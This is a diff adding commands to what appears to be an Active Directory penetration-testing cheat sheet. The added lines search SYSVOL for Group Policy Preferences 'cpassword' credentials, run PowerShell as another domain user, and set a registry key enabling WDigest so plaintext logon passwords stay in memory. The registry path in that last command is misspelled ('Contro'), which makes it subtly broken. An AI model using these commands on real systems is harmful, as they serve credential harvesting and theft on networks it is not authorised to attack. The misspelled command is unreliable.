@@ -42,3 +42,20 @@ Get-NetGroup -UserName [username]
 Get-DomainTrust
 Get-ForestTrust
 -Search for trust relationships
+
+# Find GPP Passwords in SYSVOL
+```
+findstr /S cpassword $env:logonserver\sysvol\*.xml
+```
+```
+findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)
+```
+
+# Run Powershell prompt as a different user, without loading profile to the machine [replace DOMAIN and USER]
+```
+runas /user:DOMAIN\USER /noprofile powershell.exe
+```
+# Insert reg key to enable Wdigest on newer versions of Windows
+```
+reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1
+```
